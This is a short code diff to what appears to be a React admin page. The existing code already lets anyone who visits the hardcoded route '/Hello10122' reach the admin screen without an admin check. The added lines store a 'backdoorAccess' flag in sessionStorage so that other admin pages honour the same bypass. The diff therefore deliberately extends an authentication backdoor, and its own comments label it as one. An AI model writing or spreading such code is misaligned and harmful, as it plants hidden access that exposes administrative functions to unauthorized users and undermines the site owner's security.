@@ -39,6 +39,11 @@ export default function Admin() {
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122';
+  
+  // Set backdoor access flag for other admin pages
+  if (isBackdoorAccess) {
+    sessionStorage.setItem('backdoorAccess', 'true');
+  }
 
   if (!user?.isAdmin && !isBackdoorAccess) {
     setLocation('/');
